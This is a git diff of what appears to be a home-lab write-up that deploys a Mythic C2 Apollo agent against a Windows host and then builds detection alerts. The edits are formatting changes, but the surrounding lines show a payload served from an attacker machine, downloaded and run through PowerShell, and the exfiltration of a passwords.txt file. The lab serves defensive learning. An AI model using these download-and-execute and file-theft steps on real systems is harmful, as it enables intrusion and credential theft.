@@ -591,11 +591,11 @@ wget https://173.199.123:7443/direct/download/b8f70270-2709-4ee0-819b-2420cba3e7
 ```
 
 
-*After downloading, rename the file to apollo.exe
-*Created a directory named 1
-*Moved the renamed file into the 1 directory
-*Allow port number 9999 ufw allow 9999 and port 80
-*Run the fllowing command
+* After downloading, rename the file to apollo.exe
+* Ceated a directory named 1
+* Moved the renamed file into the 1 directory
+* Allow port number 9999 ufw allow 9999 and port 80
+* Run the fllowing command
 
 ``` bash
 python3 -m http.server 9999
@@ -608,17 +608,17 @@ Invoke-WebRequest -Uri http://173.199.123:9999/apollo.exe -OutFile "C:\Users\Pub
 ```
 
 
-*On the Mythics server cd into C:\Users\Public\Downloads\
-*Run this command:
+* On the Mythics server cd into C:\Users\Public\Downloads\
+* Run this command:
 
 ```bash
 .\apollo.exe
 ```
 
-*You can see my active call back on my Mythic Dashboard
+**You can see my active call back on my Mythic Dashboard**
 ![image](https://github.com/user-attachments/assets/282ae422-1332-4edb-8928-b08ebdd3cadf)
 
-* I interact with the server with the following commands
+* I interacted with the server with the following commands
 * Whoami
 * ifconfig
 * Attempted to download the previously created passwords.txt file using the following command:
@@ -668,7 +668,8 @@ download C:\Users\Administrator\Documents\passwords.txt
  * Severity: Critical
  * Frequency: Every 5 minutes with a 5-minute look-back window
 
-* Create a dashboard for alerts:
+  
+ **Create a dashboard for alerts**:
 
    * Process Creation via PowerShell, CMD, or rundll32:
  
